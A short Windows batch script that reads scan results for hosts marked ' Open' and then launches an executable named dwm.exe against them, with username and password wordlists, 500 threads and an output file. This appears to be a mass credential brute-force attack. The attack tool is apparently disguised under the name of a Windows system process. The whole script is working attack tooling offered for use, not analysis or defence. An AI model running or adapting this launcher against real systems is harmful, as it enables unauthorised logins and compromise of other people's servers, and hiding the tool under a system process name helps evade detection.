@echo off
setlocal EnableDelayedExpansion
cd /d "%~dp0"


%SystemRoot%\System32\findstr.exe " Open" Result.txt && start dwm.exe -i Result.txt -u user.txt -p pass.txt -t 500 -o out.txt -q 2018.sql

exit